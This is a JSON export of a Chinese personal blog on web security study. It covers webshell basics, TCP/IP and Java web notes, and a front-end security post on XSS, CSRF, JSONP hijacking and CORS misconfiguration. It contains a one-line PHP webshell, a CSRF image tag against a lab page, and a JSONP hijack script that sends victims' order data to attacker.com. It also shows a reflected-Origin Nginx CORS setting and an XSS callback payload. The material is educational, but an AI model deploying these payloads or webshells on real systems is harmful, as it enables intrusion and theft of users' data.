{"posts":[{"title":"谈谈对Webshell的学习","content":"Webshell 1、Shell Shell是一个 命令解释器 ：用于接收使用者输入的指令，并送入内核去执行。解释使用者输入的指令。是一种为使用者提供操作界面的软件。 基本上分为两大类： 图像界面shell 应用最为广泛的 Windows Explorer （微软的windows系列操作系统），还有也包括广为人知的 Linux shell，其中linux shell 包括 X window manager (BlackBox和FluxBox），以及功能更强大的CDE、GNOME、KDE、 XFCE。 命令式shell Unix/linux 系统：bash / sh / ksh / csh / zsh Winodws系统：cmd.exe、PowerShell 2、Webshell Webshell是一种Web形式的命令解释器，以asp、jsp、php或者cgi等动态脚本语言编写一种执行系统代码的环境。通过浏览器访问网站服务器Web目录下的Webshell，输入指令，来达到管理目标网站的服务器。 以最常见的php webshell为例： &lt;?php system($_GET('command')); ?&gt; 通过GET方式comand参数来传递命令，由system函数执行。 3、Webshell分类 4、Webshell管理工具 在以前菜刀没有出现的时候，我们想要获取 webshell 的时候，通常都是直接上传一个 web 木马并且直接用这个木马进行管理，由于这种大型木马的体量比较大，上传过程中容易被检测且不方便进行上传绕过测试，所以大家就想了一个办法，先上传一个体量小，功能少的小型木马然后再通过小马的简单的上传或者文件修改等单个功能进行大马的上传。小马的功能通常是围绕文件管理的功能，比较简单，如：文件上传、文件修改、新建文件等，都是围绕方便上传一个体量大的木马来做的。自从菜刀出现之后，渐渐的一句话木马成为了主流，体量小，还有一个界面版的客户端进行管理操作，极大的方便的大家对于 web 服务器的管理。 上传完大马后，直接访问对应位置即可进行相应管理： 而一句话木马则提供了一个界面版的客户端进行管理操作，极大的方便的大家对于Web服务器的管理： 常见的Webshell管理工具：https://www.cnblogs.com/xiaozi/p/12397211.html ","link":"https://zzggtt.github.io/post/tan-tan-dui-webshell-de-xue-xi/"},{"title":"《图解TCP/IP》读书笔记","content":"前言 了解TCP/IP是对渗透测试很有必要的，下面是我阅读完《图解TCP/IP》后，记录的一些重要的知识点。 （随着我的渗透测试学习，将会持续更新！！！） TCP/IP概述 1、含义 互联网在进行通信时，需要相应的网络协议，而在网络中被广泛使用的TCP/IP协议。TCP/IP协议在多数情况下指的是：利用IP进行通信时所必须用到的协议群的统称。 2、分层模型 OSI参考模型注重“通信协议必要的功能是什么”，而TCP/IP则更强调“在计算机上实现协议应该开放哪种程序” 硬件层 TCP/IP的最底层的主要作用是负责数据传递的硬件。 网卡层 网卡层也称网络接口层，可以理解为“驱动程序”。它是硬件与操作系统之间的桥梁。计算机的外设不是直接插上就能使用的，还需要“驱动程序”的支持。所以通常需要在操作系统上安装一些驱动程序软件，才能使用这些附加硬件。 互联网层 互联网层使用IP协议，IP协基于IP地址转发分发数据。 传输层 传输层的主要功能是让应用程序软件之间实现通信，它具有来个代表性的协议：TCP、UDP。 应用层 TCP/IP的应用层把OSI参考模型中的会话层、表示层、应用层的功能都集中到应用程序软件中来实现。TCP/IP应用的架构绝大数属于C/S架构。 提供服务的应用程序叫做服务端，接收服务的应用程序叫做客户端。在这种通信模式中，提供服务的程序会被预先部署到服务器主机上，等待接收任何时刻客户端发送的请求。 WWW 在WWW中，用户通过Web浏览器（客户端），就可以访问存储在Web服务器上的各种信息。Web浏览器和Web服务器之间的通信协议是HTTP（应用层协议），所传输的数据的主要格式是HTML（表示层协议）。 电子邮件 电子邮件之在网络上发送邮件，发送邮件的通信协议是SMPT（应用层协议）。起初只能发送文本格式，然而现在电子邮件由MIME协议（表示层协议）拓展后，就可以发送声音、图片等各式各样的信息。 文件传输 文件传输协议是指将保存在其他计算机硬盘上的文件传输到本地硬盘上，该过程使用的协议是FTP。 远程登陆 远程登陆指的是登录到远程的计算机上。在TCP/IP中常用TELNET和SSH两种协议。 3、通信示例 地址的唯一性 基础概念 IP地址 用于识别TCP/IP网络中互联的主机和路由器。 MAC地址 用于是被同一链路中不同的计算机。 端口 用于识别一台计算机中正在运行的不同的应用程序。 通信识别 在TCP/IP或UDP/IP通信中，通常采用5个信息来识别一个通信：源IP地址、目标IP地址、协议号、源端口号、目标端口号： ","link":"https://zzggtt.github.io/post/lesslesstu-jie-tcpipgreatergreater-du-shu-bi-ji/"},{"title":"复习一下Web基础知识","content":"前言 在《图解TCP/IP》中，了解到WWW是促使互联网发展的重要动力，所以准备复习一下JavaWeb相关的基础知识。 通信协议HTTP Web客户端（浏览器）和web服务器之间主要是通过http协议来进行交互。想要快速掌握HTTP协议，推荐通过《图解HTTP》进行学习。掌握基础的请求和响应流。 Web 1、静态Web 静态Web对于每个用户来说，看到的都是相同的页面。例如：百度首页，对于每个用户来说都是一样的。 常见的静态Web资源有：html、css、js、image等。 2、动态Web 动态Web对于每个用户来说就因人而异。例如：百度的个人中心，就会从数据库中去加载不同用户的不同个人资料等数据。 Web服务器 ​ Web服务器处理来自客户端的HTTP请求，并返回HTTP响应。它擅长处理静态资源。而静态资源存储在Web目录中，Web服务器找到相应的静态资源后，响应给客户端。 ​ 但如果想要提供动态页面和动态数据，例如，需要从数据库中取出个人中心的数据，Web服务器就显得有些力不从心了。这时就需要一个辅助应用，能够生成动态页面，而且这个应用能与Web服务器通信，并且能够和后端java语言进行交互，从而从数据库存取数据。这个辅助应用就是servlet。 Servlet ​ Servlet就是sun公司开发动态web的一门技术，Sun公司在这些API中提供一个接口叫做Servlet。我们一般把实现了Servlet接口的java类也称之为Servlet。在MVC设计模式中，servlet扮演着C（控制器）的角色，当客户请求到来，进入到Servlet，Servlet调用M（业务逻辑）从数据库中存取数据 但Servlet也需要帮助。当请求到来时，必须有人加载、初始化和实例化Servlet，或者创建或分配一个新的线程处理这个请求，调用Servlet的doGet（）、doPost（）方法。并需要有人创建servlet必须的参数HTTPServletRequest和HTTPServletResponse。当请求处理结束后，有人销毁Servlet，管理着Servlet的生命周期。这个人就是Web容器也称Web应用服务器。 Web容器 ​ Servlet没有main()方法，它们受控于另一个Java应用，这个Java应用称为容器。 Tomcat就是这样一个容器，如果Web服务器（如Apache）得到一个指向某Servlet的请求（而不是其他请求，如请求一个普通的静态页面），此时Web服务器不是把这个请求交给servlet本身，而是交给部署该Servlet的容器，要由容器向Servlet提供HTTP请求和响应，而且要由容器调用Servlet的方法，如doGet()和doPost()。 用一个丑陋的图来形容就是： ","link":"https://zzggtt.github.io/post/fu-xian-yi-xia-web-ji-chu-zhi-shi/"},{"title":"前端黑知识整理","content":"前端安全 前言 偶然一次看见亮神博客中分享的一句话后，深有感悟。 在写的过程中，我深深体会到分享者才是学习中的最大受益者，由于需要成文章，所以需要查阅大量的资料。在整个过程中，又学习到很多知识点。 Table of Contents Basical XSS CSRF 跨域安全 Basical 1、前端安全事件的角色 Web安全事件的角色如下： W3C 浏览器厂商 Web开发商 用户 攻击者 2、浏览器的同源策略 浏览器的同源策略（Same Origin Policy）是众多安全策略的一个，它是浏览器最基本也是最核心的安全功能。 如果Web世界没有同源策略，当你登陆Gmial邮箱并打开另一个站点时，这个站点上的JavaScript就可以跨域读取你的Gmail邮箱数据。 它规定：不同域的客户端脚本在没有明确的授权下不能读写对方的资源 同域与非同域 浏览器提出了Origin（源）这一概念，同域要求两个站点同协议、同域名、同端口，下图展示了表中所列站点与http://www.foo.com 是否同域的情况： 需要注意的是，对于当前页面来说，页面内存放JavaScript文件的域并不重要，重要的是加载JavaScript的页面所在的域。 在浏览器中script、img、iframe、link等标签的src属性可以跨域加载脚本资源（加载的过程实际上是发起一个GET请求），而不受同域策略限制。加载的脚本资源和本域的资源一样，存在于整个上下文环境种。 例如a.com加载了b.com的脚本资源： &lt;script src=&quot;htts://www.b.com/b.js&quot;&gt;&lt;/script&gt; 但是b.js被加载后所在的域是a.com而非b.com。 客户端脚本 在Web发展至现在，客户端脚本主要指的是JavaScript（各浏览器原生支持的脚本语言）。 授权 AJAX是严格遵守浏览器的同源策略的，是不能进行跨域访问资源的。但是在HTML5新标准中，提到了有关于AJAX跨域访问的情况，即CORS策略。只有在资源服务器返回明确的HTTP响应头后，才能跨域访问资源。 读写权限 Web上有很多资源，其权限也不相同。比如：Referer只有读权限，而document.cookie则具备读写权限。 资源 同源策略里的资源指的是Web客户端的资源。一般来说，包括：HTTP响应头、Dom树、浏览器存储的资源（Cookie、locakStorage等）。 Conclusion： 前端安全以用户和浏览器为对象载体，而浏览器的安全又以同源策略为基础，只有深入理解同源策略，才能研究好前端安全。 3、how browser works 浏览器获得从服务端返回的HTML文档后，会自上而下的加载html文档，并且在加载的过程中进行解析渲染。 具体流程参考： How Browser Works：https://github.com/ScrappyZhang/How-browsers-work 4、Cookie HTTP Cookie是服务器发送到用户浏览器并保存在本地的一段数据。 同域内浏览器发送的任何一个请求都会带上Cookie，并出现在请求头的Cookie字段中。 GET /sample_page.html HTTP/1.1 Host: www.example.org Cookie: yummy_cookie=choco; tasty_cookie=strawberry 服务器的响应头 Set-Cookie字段跨域增删改Cookie，大多数情况下JavaScript也可以增删改Cookie。 HTTP/1.0 200 OK Content-type: text/html Set-Cookie: yummy_cookie=choco Set-Cookie: tasty_cookie=strawberry Cookie 主要用于以下三个方面： 会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息） 个性化设置（如用户自定义设置、主题等） 浏览器行为跟踪（如跟踪分析用户行为等） 5、AJAX AJAX（Asynchronous JavaScript And XML）即异步的JavaScript和XML。通过在后台与服务器进行少量数据交换，AJAX 可以使网页实现异步更新。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。 异步 异步和同步对应，可以理解为单独开启了一个线程，独立于浏览器主线程去做自己的事，这样浏览器就不会等待。 JavaScript AJAX本身就是由JavaScript构成的，JQuery就封装了很多与AJAX有关的方法。 XML XML指的是数据格式，比如，AJAX 发出去的 HTTP 请求，响应回的数据是 XML 格式，然后 JavaScript 去解析这个 XML DOM 树得到相应节点的内容。其实响应回的数据格式还可以是 JSON（已经是主流）、文本、HTML 等。AJAX 中特别提到 XML是因为历史原因。 6、JSONP JSONP 全称是 JSON with Padding，是为了解决不能跨域获取数据而产生的一种兼容性非常优秀的通信方式。 参考链接： https://blog.csdn.net/hansexploration/article/details/80314948 https://www.cnblogs.com/soyxiaobi/p/9616011.html 7、CORS AJAX 是严格遵守同源策略的，既不能从另一个域读取数据，也不能发送数据到另一个域。不过有一种情况，可以发送数据到另一个域，W3C 的新标准中，CORS（Cross-Origin Resource Sharing）开始推进浏览器支持这样的跨域方案，现在的浏览器都支持这个方案了 工作流程 用户浏览器对资源服务器发起一个跨域请求，并在请求头中添加Origin头，用于声明请求方的来源。 资源服务器根据Origin头返回访问控制策略(Access-Control-Allow-Origin响应头)，并在其中声明允许读取响应内容的源。 浏览器检查资源服务器在Access-Control-Allow-Origin头中声明的源，是否与请求方的源相符，如果相符合，则允许请求方脚本读取响应内容，否则不允许。 附带身份凭证的请求 一般而言，对于跨域的AJAX请求，浏览器不会发送credentials（包括Cookie，TLS客户端证书和代理验证信息）。如果要发送凭证信息，需要设置 XMLHttpRequest的某个特殊标志位。 var xml = new XMLHttpRequest(); xml.withCredentials = true; //发送凭证 如果跨域请求中带了credentials，那么浏览器会检查资源服务器返回的响应头中Access-Control-Allow-Credentials头是否设置为true，如果是，则允许请求方读取响应内容，否则，不允许。 XSS 1、漏洞原理 XSS（Cross Site Script）即跨站脚本攻击。发生在目标网站目标用户的浏览器层面。 当目标用户的浏览器渲染整个HTML文档时，出现了不被预期的脚本指令并执行时，XSS就会发送。 场景 目标网站目标用户的浏览器渲染服务端返回的HTML文档时，即浏览器进行HTML解析和JavaScript解析时。 浏览器对返回资源类型的判定取决Content-Type响应头。 除了浏览器，现在越来越多的客户端软件支持HTML解析和JavaScript解析，比如：QQ、音乐播放器、PDF、文档等等，XSS设计的场景也越来越广。 本质 HTML代码段与用户数据段未分离： &lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;XSS Test&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;?php $data = $_GET[&quot;param&quot;]; echo &quot;&lt;p&gt;{$data}&lt;/p&gt;&quot;;//$data是用户可控的变量 ?&gt; &lt;/body&gt; &lt;/html&gt; 浏览器把用户的数据段$data，当作HTML代码来解析执行。 2、Payload 攻击者通过XSS，能够在目标用户浏览的页面中插入恶意的脚本代码，以达到控制用户浏览器的目的。 利用方式，可以参考 beef，比如： 普通用户（Cookies、隐私数据、IP、日志、相片、邮件、CSRF 等） 管理员（后台地址、页面源码、管理员信息、CSRF 等） 客户端攻击（浏览器特权域、插件、APP、WebView 等） 内网渗透（端口扫描、ST2利用、路由器） 键盘记录、rootkit、蠕虫攻击、水坑、钓鱼、劫持 ） Payload可参考： [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS Injection) CSRF 1、漏洞原理 当目标用户登陆了目标网站后，被攻击者诱使访问了恶意构造的页面后，浏览器就会带上用户的Cookie在恶意页面对目标网站的某功能发起跨站请求。 某修改个人信息的功能存在CSRF： 该功能实际上是发出了一个GET请求： http://127.0.0.1/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=girl&amp;phonenum=12345678901&amp;add=usa&amp;email=lucy%40qq.com&amp;submit=submit 实际攻击流程如下： 攻击者在自己的网站伪造一个页面(http://www.attacker.com/csrf.html)： &lt;img src=&quot;http://127.0.0.1/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=girl&amp;phonenum=12345678901&amp;add=usa&amp;email=lucy%40qq.com&amp;submit=submit&quot;&gt; 攻击者诱使已登陆目标网站的目标用户访问该页面： 可以看出浏览器为了加载img标签，去请求了src属性里的url。 再看看用户的信息，已被修改了： 2、伪造的本质 CSRF攻击之所以能够成功，是因为攻击者可以预测出重要操作请求的所有参数。然后才能伪造出一个页面，去诱使用户访问。 另一方面，是因为Cookie机制，浏览器发起请求时，会带上用户的Cookie（会话信息），能成功的通过身份认证，去执行重要操作。 3、Payload GET请求 直接构造URL POST请求 通过HTML的form表单提交数据 JSON数据格式 通过XMLHttpRequest提交JSON格式的数据 具体Payload参考如下： [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF Injection) 跨域安全 JSONP安全 1、JSON劫持 JSON劫持的攻击过程是属于CSRF范畴。当某网站通过JSONP 的方式来跨域（一般为子域）传递用户认证后的敏感信息时，攻击者可以构造恶意的 JSONP 调用页面，诱导被攻击者访问来达到截取用户敏感信息的目的。 以乌云网上报告的一个例子（wooyun-2015-0118712）来分析： 苏宁易购基本所有jsonp接口都没有做防护，导致第三方网站可调用苏宁的jsonp接口获取到用户敏感信息： 漏洞处功能详细说明： 获取用户登陆状态的接口[是否登陆，会员编号] http://my.suning.com/authStatus?callback=jQuery17206592 获取用户个人信息的接口[加星的邮箱，用户级别，用户安全等级等] http://my.suning.com/memberInfoPageHead.do?callback=jQuery1720402 获取用户订单信息[下单时间，订单号，订单商品，订单金额，订单状态等] http://www.suning.com/emall/myShoppingOrderCmd?itemNum=3&amp;callback=jQuery1720659299 获取用户地址簿接口[所有姓名、住址、加星手机号] http://my.suning.com/address.do?callback=jQuery172081 攻击流程： 攻击者构造一个劫持页面： &lt;!--编写一个劫持函数：hijack --&gt; &lt;script&gt; function hijack(){ //alert(data); new Image().src=&quot;http://www.attacker.com/hijack.php?hi=&quot; + escape(data);//将劫持到的数据发送到攻击者服务器上 } &lt;/script&gt; &lt;!--获取用户订单信息接口：使用hijack为回调函数--&gt; &lt;script src=&quot;http://www.suning.com/emall/myShoppingOrderCmd?itemNum=3&amp;callback=hijack&quot;&gt;&lt;/script&gt; 然后攻击者欺骗已登陆目标网站（苏宁）的用户访问该页面。 这个攻击过程其实是浏览器发起了一个 CSRF GET 请求。由于目标用户已登陆，所以浏览器发起请求会带上目标用户的cookie身份认证信息，并且服务端返回敏感信息。 然后目标用户的订单信息就会被劫持发送到攻击者服务器上。 二、Callback 可定义导致的安全问题 服务端在返回数据时，如果没有严格定义好Content-Type（Content-Type: application/json），再加上callback这个输出点没有进行过滤，而直接输出就会导致一个典型的XSS。 例如如下一个jsonp接口： http://example/ajax/services/search/web?v=1.0&amp;q=?&amp;callback=? 客户端除了传递q=?以外，还会传递一个回调函数名给服务端callback=?。 如果Content-Type（application / javascript）和callback未作过滤，直接返回。通过下面的payload就可以构造一个XSS： http://example/ajax/services/search/web?v=1.0&amp;q=?&amp;callback=&lt;script&gt;alert(1)&lt;/script&gt; 参考链接： https://blog.knownsec.com/2015/03/jsonp_security_technic/ CORS配置错误 CORS协议的本质是由服务端配置的策略指导客户端浏览器，以实现跨域资源共享。但是一旦服务器端访问控制策略配置出现错误，就会出现浏览器SOP被绕过，导致用户的信息被劫持。 1、反射Origin 因为CORS标准规定，Access-Control-Allow-Origin只能配置为单个origin, null或*。如果开发者想要实现同时与多个域名共享域名的需求，则需要专门编写代码或者使用framework来协助动态生成访问控制策略。这种动态生成的做法增加了开发者配置难度。 最简单地动态生成访问控制策略的方法，就是在Access-Control-Allow-Origin中反射请求的Origin值。例如，下面是一个错误 Nginx 配置示例： add_header &quot;Access-Control-Allow-Origin&quot; $http_origin; add_header &quot;Access-Control-Allow-Credentials&quot; &quot;true&quot;; 2、校验Origin不严格 3、null CORS协议复用了Origin头，但在CORS标准中同样缺乏对跨域请求Origin中null明确的定义和限制。有些开发者在网站上配置信任null，用于与本地file页面共享数据，如下所示： Access-Control-Allow-Origin: null Access-Control-Allow-Credentials:true 但是事实上，除了本地file页面的跨域请求Origin头为null外，攻击者还可以从任意域下通过iframe sandbox构造Origin为null的跨域请求，如下是一段示意代码： &lt;iframe sandbox=&quot;allow-scripts allow-top-navigation allow-forms&quot; src=&quot;data:text/html,&lt;script&gt;XMLHttpRequest here&lt;/script&gt;&quot; &gt; &lt;/iframe&gt; 这就意味着任何配置有Access-Control-Allow-Origin: null和Access-Control-Allow-Credentials: true的网站等同于没有浏览器SOP的保护，都可以被其他任意域以这种方式读取内容。 4、HTTPS域信任HTTP域 HTTPS协议被设计用于在不安全的中间网络中进行安全通信。即使在中间人网络环境下，攻击者也应该无法读取HTTPS网站的内容。但是如果该HTTPS网站配置了CORS且信任HTTP域，那么中间人攻击者可以先劫持受信任HTTP域，然后通过这个域发送跨域请求到HTTPS网站，间接读取HTTPS域下的受保护内容。具体流程如图所示，中间人攻击者可以可以利用http://example.com网站为跳板，窃取 HTTPS 网站的内容。 Payload [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS Misconfiguration) 参考链接： https://research.qianxin.com/archives/290 ","link":"https://zzggtt.github.io/post/qian-tan-qian-duan-hei/"},{"title":"关于","content":" 📝温故而知新 📒 twitter：https://twitter.com/Zer0ney1 📙 wechat：z807852704 ","link":"https://zzggtt.github.io/post/about/"}]}